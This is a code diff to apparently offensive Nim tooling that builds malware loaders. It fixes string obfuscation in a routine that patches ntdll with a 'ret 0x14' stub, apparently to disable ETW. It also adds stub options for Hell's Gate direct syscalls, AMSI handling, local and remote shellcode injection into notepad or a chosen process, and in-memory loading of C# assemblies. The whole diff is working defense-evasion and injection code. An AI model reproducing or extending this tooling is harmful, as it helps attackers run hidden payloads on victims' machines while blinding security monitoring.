@@ -812,25 +812,6 @@ type
         ReservedForDebuggerInstrumentation*     : array[0x10, winimport.PVOID]
     PTEB* = ptr TEB
 
-type
-  PS_ATTR_UNION* {.pure, union.} = object
-    Value*: ULONG
-    ValuePtr*: PVOID
-  PS_ATTRIBUTE* {.pure.} = object
-    Attribute*: ULONG 
-    Size*: SIZE_T
-    u1*: PS_ATTR_UNION
-    ReturnLength*: PSIZE_T
-  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
-  PS_ATTRIBUTE_LIST* {.pure.} = object
-    TotalLength*: SIZE_T
-    Attributes*: array[2, PS_ATTRIBUTE]
-  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
-  KNORMAL_ROUTINE* {.pure.} = object
-    NormalContext*: PVOID
-    SystemArgument1*: PVOID
-    SystemArgument2*: PVOID
-  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
 
 
 
@@ -1274,7 +1255,7 @@ proc Patchntdll(): bool =
         let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
     # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
     # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    ntdll = loadLib("obf(ntdll)")
+    ntdll = loadLib(obf("ntdll"))
     if isNil(ntdll):
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
@@ -1989,15 +1970,25 @@ if (hellsgate):
                 stub = stub & ETWCOMVARStub
             else:
                 stub = stub & HellsgateProtectDelegate & HellsgateETWPatchStub
-    if(localinject):
+    if(localinject and (csharp == false)):
         stub = stub & HellsgateAllocDelegate & HellsgateLocalInjectStub
-    else:
+    if ((localinject == false) and (csharp == false)):
         # ToDo - not ready yet
         stub.add(RemoteProcImportStub)
         if (processname == ""):
             stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
         else:
             stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customproc & ShellcoderemoteinjectStub
+    if (csharp):
+        stub.add(AssemblyImports)
+        echo "adding Stub:"
+        if (noArgs):
+            stub.add(LoadAssemblyStub)
+            stub.add(LoadAssemblyStubNoArgs)
+        else:
+            stub.add(LoadAssemblyStub)
+            stub.add(LoadAssemblyStubArgs)
+        csharp = false
 if (shellcode):
     stub.add(GetSyscallStub)
     if (AMSI):
